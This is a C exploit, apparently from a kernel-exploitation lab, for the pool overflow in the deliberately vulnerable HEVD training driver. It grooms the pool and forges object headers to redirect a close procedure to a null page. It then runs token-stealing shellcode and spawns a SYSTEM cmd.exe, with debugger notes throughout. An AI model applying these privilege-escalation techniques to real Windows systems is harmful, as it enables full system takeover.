#include "stdafx.h"
#include "windows.h"

typedef NTSTATUS(WINAPI *_NtAllocateVirtualMemory)(
	HANDLE ProcessHandle,
	PVOID *BaseAddress,
	ULONG_PTR ZeroBits,
	PSIZE_T AllocationSize,
	ULONG AllocationType,
	ULONG Protect
);

int main()
{
	printf("Triggering the Pool Overflow vulnerability in HEVD\r\n");
	printf("---------------------------------------------------\r\n");
	
	int allocSuccessCount = 0;
	HANDLE result = NULL;
	HANDLE resultArray[10000] = { 0 };
	printf("Spraying NonPagedPool with 10000 event objects to fill inital spaces\r\n");
	for (int i = 0; i < 10000; i++) {
		result = CreateEventA(NULL, 0, 0, "");
		if (result != NULL) {
			allocSuccessCount += 1;
			resultArray[i] = result;
		}
	}
	printf("Allocated %i event objects\r\n", allocSuccessCount);

	printf("Allocating 5000 event objects which should be consecutive\r\n");
	allocSuccessCount = 0;
	HANDLE handleArray[5000] = { 0 };
	for (int i = 0; i < 5000; i++) {
		result = CreateEventA(NULL, 0, 0, "");
		if (result != NULL) {
			handleArray[i] = result;
			allocSuccessCount += 1;
		}
	}
	printf("Allocated %i additional event objects\r\n", allocSuccessCount);

	printf("Creating holes in the sequental allocation section\r\n");
	int freeCount = 0;
	for (int a = 0; a < 5000; a += 16) {
		if (CloseHandle(handleArray[a]) != NULL) {
			freeCount += 1;
			handleArray[a] = NULL;
		}
		if (CloseHandle(handleArray[a+1]) != NULL) {
			freeCount += 1;
			handleArray[a+1] = NULL;
		}
		if (CloseHandle(handleArray[a+2]) != NULL) {
			freeCount += 1;
			handleArray[a+2] = NULL;
		}
		if (CloseHandle(handleArray[a+3]) != NULL) {
			freeCount += 1;
			handleArray[a+3] = NULL;
		}
		if (CloseHandle(handleArray[a+4]) != NULL) {
			freeCount += 1;
			handleArray[a+4] = NULL;
		}
		if (CloseHandle(handleArray[a+5]) != NULL) {
			freeCount += 1;
			handleArray[a+5] = NULL;
		}
		if (CloseHandle(handleArray[a+6]) != NULL) {
			freeCount += 1;
			handleArray[a+6] = NULL;
		}
		if (CloseHandle(handleArray[a+7]) != NULL) {
			freeCount += 1;
			handleArray[a+7] = NULL;
		}
	}
	printf("Free'd %i allocations\r\n\r\n", freeCount);

	printf("Opening handle to device\r\n");
	HANDLE driverHandle = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", FILE_READ_ACCESS | FILE_WRITE_ACCESS, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);
	if (driverHandle == INVALID_HANDLE_VALUE) {
		printf("Unable to open handle to device. Exiting\r\n");
		return 1;
	}

	printf("\r\nSetting up POOL_HEADER n other structures n memcpy them into buffer to send\r\n");

	/*
	kd> dt nt!_POOL_HEADER 8587fc40
	+0x000 PreviousSize     : 0y001000000 (0x40)
	+0x000 PoolIndex        : 0y0000000 (0)
	+0x002 BlockSize        : 0y000001000 (0x8)
	+0x002 PoolType         : 0y0000010 (0x2)
	+0x000 Ulong1           : 0x4080040
	+0x004 PoolTag          : 0xee657645
	+0x004 AllocatorBackTraceIndex : 0x7645
	+0x006 PoolTagHash      : 0xee65
	kd> dd 8587fc40
	8587fc40  04080040 ee657645 00000000 00000040
	8587fc50  00000000 00000000 00000001 00000001
	8587fc60  00000000 0008000c 86f6d440 00000000
	8587fc70  00040001 00000000 8587fc78 8587fc78
	8587fc80  04080008 ee657645 00000000 00000040
	8587fc90  00000000 00000000 00000001 00000001
	8587fca0  00000000 0008000c 86f6d440 00000000
	8587fcb0  00040001 00000000 8587fcb8 8587fcb8
	*/

	// Make pool header according to above info.
	byte PoolHeader[0x9] = ("\x40\x00\x08\x04" // 0x04080040 in little endigan, setting PreviousSize (0x40), PoolIndex (0x00), and BlockSize (0x8), and I *think* Ulong1 and PoolType?
	"\x45\x76\x65\xee" // 0xee657645 in little endigan, setting PoolTag, AllocatorBackTraceIndex, and PoolTagHash.
	);

	/*
	kd> dd 8587fc40+8
	8587fc48  00000000 00000040 00000000 00000000
	8587fc58  00000001 00000001 00000000 0008000c
	8587fc68  86f6d440 00000000 00040001 00000000
	8587fc78  8587fc78 8587fc78 04080008 ee657645
	8587fc88  00000000 00000040 00000000 00000000
	8587fc98  00000001 00000001 00000000 0008000c
	8587fca8  86f6d440 00000000 00040001 00000000
	8587fcb8  8587fcb8 8587fcb8 04080008 ee657645
	kd> dt nt!_OBJECT_HEADER_QUOTA_INFO 8587fc40+8
	+0x000 PagedPoolCharge  : 0
	+0x004 NonPagedPoolCharge : 0x40
	+0x008 SecurityDescriptorCharge : 0
	+0x00c SecurityDescriptorQuotaBlock : (null)
	*/

	// Make OBJECT_HEADER_QUOTA_INFO buffer
	byte objectHeaderQuotaInfo[0x11] = ("\x00\x00\x00\x00" // Set PagedPoolCharge to 0
	"\x40\x00\x00\x00" // Set NonPagedPoolCharge to 0x40
	"\x00\x00\x00\x00" // Set SecurityDescriptorCharge to 0
	"\x00\x00\x00\x00" // Set SecurityDescriptorQuotaBlock to NULL
	);

	/*
	kd> dd 8587fc40+8+10
	8587fc58  00000001 00000001 00000000 0008000c
	8587fc68  86f6d440 00000000 00040001 00000000
	8587fc78  8587fc78 8587fc78 04080008 ee657645
	8587fc88  00000000 00000040 00000000 00000000
	8587fc98  00000001 00000001 00000000 0008000c
	8587fca8  86f6d440 00000000 00040001 00000000
	8587fcb8  8587fcb8 8587fcb8 04080008 ee657645
	8587fcc8  00000000 00000040 00000000 00000000
	kd> dt nt!_OBJECT_HEADER 8587fc40+8+10
	+0x000 PointerCount     : 0n1
	+0x004 HandleCount      : 0n1
	+0x004 NextToFree       : 0x00000001 Void
	+0x008 Lock             : _EX_PUSH_LOCK
	+0x00c TypeIndex        : 0xc ''
	+0x00d TraceFlags       : 0 ''
	+0x00e InfoMask         : 0x8 ''
	+0x00f Flags            : 0 ''
	+0x010 ObjectCreateInfo : 0x86f6d440 _OBJECT_CREATE_INFORMATION
	+0x010 QuotaBlockCharged : 0x86f6d440 Void
	+0x014 SecurityDescriptor : (null)
	+0x018 Body             : _QUAD
	*/

	// Only need to overwrite part of the object header here, so lets take the parts we need to set and correct the values :)
	byte objectHeader[0x11] = ("\x01\x00\x00\x00" // Set PointerCount to 1
	"\x01\x00\x00\x00" // Set HandleCount to 1, we also set NextToFree here but we don't really care to be honest.
	"\x00\x00\x00\x00" // Set Lock to _EX_PUSH_LOCK
	"\x00" // Here we change TypeIndex from 0xC to 0x0 so it points to the null page instead of normal page. Then when we go to look for OBJECT_TYPE structure it will be looking in the NULL page instead of the normal object page.
	"\x00" // Set TraceFlags to 0
	"\x08" // Set InfoMask to 0x8
	"\x00" // Set Flags to 0
	// Don't overwrite other stuff as this info will be dynamically generated and we don't need to alter it.
	);
	
	DWORD bytesReturned = 0;
	byte inBuffer[0x220] = { 0 };
	memset(inBuffer, '\x41', 0x1F8);
	memcpy(inBuffer+0x1F8, PoolHeader, 0x8); // Set the pool header of the following chunk
	memcpy(inBuffer + 0x1F8 + 8, objectHeaderQuotaInfo, 0x10); // Set the OBJECT_HEADER_QUOTA_INFO of the following chunk.
	memcpy(inBuffer + 0x1F8 + 10, objectHeader, 0x10); // Set the OBJECT_HEADER of the object within the following chunk.

	printf("Allocating shellcode...\r\n");
	char shellcode[67] = (
		//"\xCC"    //*UNCOMMENT THIS TO DEBUG THE SHELLCODE. THIS IS USEFUL IF YOU WANT TO KNOW WHY THE STACK CLEANUP HAS TO OCCUR*
		"\x60" // PUSHAD
		"\x64\xA1\x24\x01\x00\x00" // MOV EAX, fs:[KTHREAD_OFFSET]
		"\x8B\x40\x50" // MOV EAX, [EAX + EPROCESS_OFFSET]
		"\x89\xC1" // mov ecx, eax (Current EPROCESS structure)
		"\x8B\x98\xF8\x00\x00\x00" // mov ebx, [eax + TOKEN_OFFSET]
								   // #---[Copy System PID token]
		"\xBA\x04\x00\x00\x00" // mov edx, 4 (SYSTEM PID)
		"\x8B\x80\xB8\x00\x00\x00" // mov eax, [eax + FLINK_OFFSET] <-|
		"\x2D\xB8\x00\x00\x00" //               sub eax, FLINK_OFFSET |
		"\x39\x90\xB4\x00\x00\x00" //      cmp[eax + PID_OFFSET], edx |
		"\x75\xED" // jnz                                          -> |
		"\x8B\x90\xF8\x00\x00\x00" // mov edx, [eax + TOKEN_OFFSET]
		"\x89\x91\xF8\x00\x00\x00" // mov[ecx + TOKEN_OFFSET], edx
								   //#---[Recover]
		"\x61" // popad
		// No need for POP EBP here as if we look at the first call we return from it is RET 8 in function prologe, then we
		"\xC2\x04\x00" // RET 0x4
		/*
			Need to clean up 2 DWORD sized args on stack cause of following:

			Lets see the call trace with the 'k' command after we hit our \xCC breakpoint at beginning of shellcode:

			****** HACKSYS_EVD_IOCTL_POOL_OVERFLOW ******
			[+] Allocating Pool chunk
			[+] Pool Tag: 'kcaH'
			[+] Pool Type: NonPagedPool
			[+] Pool Size: 0x1F8
			[+] Pool Chunk: 0x86B8FBC8
			[+] UserBuffer: 0x0026103C
			[+] UserBuffer Size: 0x220
			[+] KernelBuffer: 0x86B8FBC8
			[+] KernelBuffer Size: 0x1F8
			[+] Triggering Pool Overflow
			[+] Freeing Pool chunk
			[+] Pool Tag: 'kcaH'
			[+] Pool Chunk: 0x86B8FBC8
			****** HACKSYS_EVD_IOCTL_POOL_OVERFLOW ******
			Break instruction exception - code 80000003 (first chance)
			000d0000 cc              int     3
			kd> k
			# ChildEBP RetAddr
			WARNING: Frame IP not in any known module. Following frames may be wrong.
			00 94d85b48 82c7080d 0xd0000
			01 94d85b94 82c91eee nt_82a49000!ObpDecrementHandleCount+0x139
			02 94d85bdc 82c91c2e nt_82a49000!ObpCloseHandleTableEntry+0x203
			03 94d85c0c 82c91fc8 nt_82a49000!ObpCloseHandle+0x7f
			04 94d85c28 82a86a06 nt_82a49000!NtClose+0x4e
			05 94d85c28 77ad70d4 nt_82a49000!KiSystemServicePostCall
			06 002608f8 77ad54f8 ntdll_77a90000!KiFastSystemCallRet
			07 002608fc 75c16be2 ntdll_77a90000!NtClose+0xc
			08 0026090c 75f5ea40 0x75c16be2
			09 0026091c 01381856 0x75f5ea40
			0a 0026fd80 013820de 0x1381856
			0b 0026fd94 01381fc0 0x13820de
			0c 0026fdec 01381e6d 0x1381fc0
			0d 0026fdf4 013820f8 0x1381e6d
			0e 0026fdfc 75f5ef1c 0x13820f8
			0f 0026fe08 77af3b53 0x75f5ef1c
			10 0026fe48 77af3b26 ntdll_77a90000!__RtlUserThreadStart+0x70
			11 0026fe60 00000000 ntdll_77a90000!_RtlUserThreadStart+0x1b
			kd>

			Ok so at this point we know that given our breakpoint is at 0xd0000 in memory and we can see 0xd0000 on the callstack,
			then we must have reach this point from the next call, aka nt!ObpDecrementHandleCount+0x139. Lets examine the function nt!ObpDecrementHandleCount:


			kd> uf nt!ObpDecrementHandleCount
			nt!ObpDecrementHandleCount:
			82c2d6d4 8bff            mov     edi,edi
			82c2d6d6 55              push    ebp
			82c2d6d7 8bec            mov     ebp,esp
			82c2d6d9 83e4f8          and     esp,0FFFFFFF8h
			82c2d6dc 83ec28          sub     esp,28h
			82c2d6df 0fb6460c        movzx   eax,byte ptr [esi+0Ch]
			82c2d6e3 8364240800      and     dword ptr [esp+8],0
			82c2d6e8 53              push    ebx
			82c2d6e9 57              push    edi
			82c2d6ea 8b3c85e0beb482  mov     edi,dword ptr nt!ObTypeIndexTable (82b4bee0)[eax*4]
			82c2d6f1 f6472a10        test    byte ptr [edi+2Ah],10h
			82c2d6f5 7517            jne     nt!ObpDecrementHandleCount+0x3a (82c2d70e)  Branch

			nt!ObpDecrementHandleCount+0x23:
			82c2d6f7 f6460f08        test    byte ptr [esi+0Fh],8
			82c2d6fb 7511            jne     nt!ObpDecrementHandleCount+0x3a (82c2d70e)  Branch

			nt!ObpDecrementHandleCount+0x29:
			82c2d6fd 8d4604          lea     eax,[esi+4]
			82c2d700 83cbff          or      ebx,0FFFFFFFFh
			82c2d703 f00fc118        lock xadd dword ptr [eax],ebx
			82c2d707 4b              dec     ebx
			82c2d708 43              inc     ebx
			82c2d709 e9c6000000      jmp     nt!ObpDecrementHandleCount+0x100 (82c2d7d4)  Branch

			nt!ObpDecrementHandleCount+0x3a:
			82c2d70e 64a124010000    mov     eax,dword ptr fs:[00000124h]
			82c2d714 66ff8884000000  dec     word ptr [eax+84h]
			82c2d71b 8d4e08          lea     ecx,[esi+8]
			82c2d71e 8bc1            mov     eax,ecx
			82c2d720 f00fba2800      lock bts dword ptr [eax],0
			82c2d725 7305            jae     nt!ObpDecrementHandleCount+0x58 (82c2d72c)  Branch

			nt!ObpDecrementHandleCount+0x53:
			82c2d727 e8a2b3e6ff      call    nt!ExfAcquirePushLockExclusive (82a98ace)

			nt!ObpDecrementHandleCount+0x58:
			82c2d72c 8d4604          lea     eax,[esi+4]
			82c2d72f 8b18            mov     ebx,dword ptr [eax]
			82c2d731 895c240c        mov     dword ptr [esp+0Ch],ebx
			82c2d735 83c9ff          or      ecx,0FFFFFFFFh
			82c2d738 f00fc108        lock xadd dword ptr [eax],ecx
			82c2d73c 49              dec     ecx
			82c2d73d f7d9            neg     ecx
			82c2d73f 1bc9            sbb     ecx,ecx
			82c2d741 41              inc     ecx
			82c2d742 741b            je      nt!ObpDecrementHandleCount+0x8b (82c2d75f)  Branch

			nt!ObpDecrementHandleCount+0x70:
			82c2d744 f6460f08        test    byte ptr [esi+0Fh],8
			82c2d748 7415            je      nt!ObpDecrementHandleCount+0x8b (82c2d75f)  Branch

			nt!ObpDecrementHandleCount+0x76:
			82c2d74a 0fb6460e        movzx   eax,byte ptr [esi+0Eh]
			82c2d74e 83e01f          and     eax,1Fh
			82c2d751 0fb68080c4b482  movzx   eax,byte ptr nt!ObpInfoMaskToOffset (82b4c480)[eax]
			82c2d758 8bce            mov     ecx,esi
			82c2d75a 2bc8            sub     ecx,eax
			82c2d75c 832100          and     dword ptr [ecx],0

			nt!ObpDecrementHandleCount+0x8b:
			82c2d75f f6472a10        test    byte ptr [edi+2Ah],10h
			82c2d763 740e            je      nt!ObpDecrementHandleCount+0x9f (82c2d773)  Branch

			nt!ObpDecrementHandleCount+0x91:
			82c2d765 ff7508          push    dword ptr [ebp+8]
			82c2d768 8d442414        lea     eax,[esp+14h]
			82c2d76c 8bd6            mov     edx,esi
			82c2d76e e84b250100      call    nt!ObpReleaseHandleInfo (82c3fcbe)

			nt!ObpDecrementHandleCount+0x9f:
			82c2d773 8d4608          lea     eax,[esi+8]
			82c2d776 8b08            mov     ecx,dword ptr [eax]
			82c2d778 8bd1            mov     edx,ecx
			82c2d77a 83e2f0          and     edx,0FFFFFFF0h
			82c2d77d 83fa10          cmp     edx,10h
			82c2d780 7605            jbe     nt!ObpDecrementHandleCount+0xb3 (82c2d787)  Branch

			nt!ObpDecrementHandleCount+0xae:
			82c2d782 8d51f0          lea     edx,[ecx-10h]
			82c2d785 eb02            jmp     nt!ObpDecrementHandleCount+0xb5 (82c2d789)  Branch

			nt!ObpDecrementHandleCount+0xb3:
			82c2d787 33d2            xor     edx,edx

			nt!ObpDecrementHandleCount+0xb5:
			82c2d789 f6c102          test    cl,2
			82c2d78c 7510            jne     nt!ObpDecrementHandleCount+0xca (82c2d79e)  Branch

			nt!ObpDecrementHandleCount+0xba:
			82c2d78e 8bd8            mov     ebx,eax
			82c2d790 8bc1            mov     eax,ecx
			82c2d792 f00fb113        lock cmpxchg dword ptr [ebx],edx
			82c2d796 8b5c240c        mov     ebx,dword ptr [esp+0Ch]
			82c2d79a 3bc1            cmp     eax,ecx
			82c2d79c 7408            je      nt!ObpDecrementHandleCount+0xd2 (82c2d7a6)  Branch

			nt!ObpDecrementHandleCount+0xca:
			82c2d79e 8d4e08          lea     ecx,[esi+8]
			82c2d7a1 e8ead0e8ff      call    nt!ExfReleasePushLockShared (82aba890)

			nt!ObpDecrementHandleCount+0xd2:
			82c2d7a6 648b0d24010000  mov     ecx,dword ptr fs:[124h]
			82c2d7ad 8d8184000000    lea     eax,[ecx+84h]
			82c2d7b3 66ff00          inc     word ptr [eax]
			82c2d7b6 0fb700          movzx   eax,word ptr [eax]
			82c2d7b9 6685c0          test    ax,ax
			82c2d7bc 7516            jne     nt!ObpDecrementHandleCount+0x100 (82c2d7d4)  Branch

			nt!ObpDecrementHandleCount+0xea:
			82c2d7be 8d4140          lea     eax,[ecx+40h]
			82c2d7c1 3900            cmp     dword ptr [eax],eax
			82c2d7c3 740f            je      nt!ObpDecrementHandleCount+0x100 (82c2d7d4)  Branch

			nt!ObpDecrementHandleCount+0xf1:
			82c2d7c5 6683b98600000000 cmp     word ptr [ecx+86h],0
			82c2d7cd 7505            jne     nt!ObpDecrementHandleCount+0x100 (82c2d7d4)  Branch

			nt!ObpDecrementHandleCount+0xfb:
			82c2d7cf e8d104e0ff      call    nt!KiCheckForKernelApcDelivery (82a2dca5)

			nt!ObpDecrementHandleCount+0x100:
			82c2d7d4 837f6000        cmp     dword ptr [edi+60h],0
			82c2d7d8 7444            je      nt!ObpDecrementHandleCount+0x14a (82c2d81e)  Branch

			nt!ObpDecrementHandleCount+0x106:
			82c2d7da 648b0d24010000  mov     ecx,dword ptr fs:[124h]
			82c2d7e1 8b4508          mov     eax,dword ptr [ebp+8]
			82c2d7e4 c644240b00      mov     byte ptr [esp+0Bh],0
			82c2d7e9 394150          cmp     dword ptr [ecx+50h],eax
			82c2d7ec 7410            je      nt!ObpDecrementHandleCount+0x12a (82c2d7fe)  Branch

			nt!ObpDecrementHandleCount+0x11a:
			82c2d7ee 8d4c2418        lea     ecx,[esp+18h]
			82c2d7f2 51              push    ecx
			82c2d7f3 50              push    eax
			82c2d7f4 e83e44e7ff      call    nt!KeStackAttachProcess (82aa1c37)
			82c2d7f9 c644240b01      mov     byte ptr [esp+0Bh],1

			nt!ObpDecrementHandleCount+0x12a:
			82c2d7fe 53              push    ebx
			82c2d7ff ff742414        push    dword ptr [esp+14h]
			82c2d803 8d4618          lea     eax,[esi+18h]
			82c2d806 50              push    eax
			82c2d807 ff7508          push    dword ptr [ebp+8]
			82c2d80a ff5760          call    dword ptr [edi+60h]
			82c2d80d 807c240b00      cmp     byte ptr [esp+0Bh],0
			82c2d812 740a            je      nt!ObpDecrementHandleCount+0x14a (82c2d81e)  Branch


			There is more code that follows but what we are really interested in is the function at address 82c2d80d, aka
			nt!ObpDecrementHandleCount+0x139. We can see before this there is a CALL instruction, which is the one
			which calls our shellcode. Before this we can see 2 DWORD sized PUSH instructions. Thus to clean up the stack we need
			to add 4*2 or 8 bytes to the stack, which is 0x8 in hex.
		*/
	);
	printf("Shellcode size: %i\r\n", sizeof(shellcode));

	printf("Reserving RWX memory for shellcode with VirtualAlloc\r\n");
	LPVOID shellcodeAddress = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	printf("Copying shellcode into this memory\r\n");
	memcpy(shellcodeAddress, shellcode, sizeof(shellcode));
	LPVOID sourceAddress = &shellcodeAddress;

	printf("\r\nAllocating NULL page\r\n");
	int baseAddress = 1;
	int AllocationSize = 0x78;
	_NtAllocateVirtualMemory NtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
	HANDLE allocNullResult = (HANDLE) NtAllocateVirtualMemory(GetCurrentProcess(), (PVOID *) &baseAddress, NULL, (PSIZE_T) &AllocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (allocNullResult == INVALID_HANDLE_VALUE) {
		printf("Unable to allocate null page!\r\n");
		return 1;
	}
	printf("Writing shellcode pointer to 0x60 to fill in CloseProcedure function pointer\r\n");
	memset((LPVOID)0x0, 0, 0x78);
	memcpy((LPVOID)0x60, sourceAddress, 4);
	DeviceIoControl(driverHandle, 0x22200F, inBuffer, sizeof(inBuffer), NULL, 0, &bytesReturned, (LPOVERLAPPED)NULL);

	printf("\r\n* Before we forget, let free up the memory to trigger the DeleteProcedure call we overwrote\r\n");
	printf("* REMINDER: If you don't do this, we won't get our shellcode to execute\r\nand steal the SYSTEM token.\r\n");
	printf("* After all this exploit is about pool chunks and what happens when\r\ncorrupted ones get freed.\r\n");
	printf("* If we never free then why should we expect this exploit to work? :D\r\n");
	printf("* P.S Sometimes Grant is really silly ;)\r\n\r\n");

	for (int count = 0; count < 5000; count++) {
		CloseHandle(handleArray[count]);
	}

	printf("Sweet! Shells from pool overflows incoming...\r\n");
	DebugBreak();
	PROCESS_INFORMATION pi;
	ZeroMemory(&pi, sizeof(pi));
	STARTUPINFOA si;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	CreateProcessA("C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi); // Spawn cmd.exe with SYSTEM privs as we have now stolen the SYSTEM token.

	return 0;
}

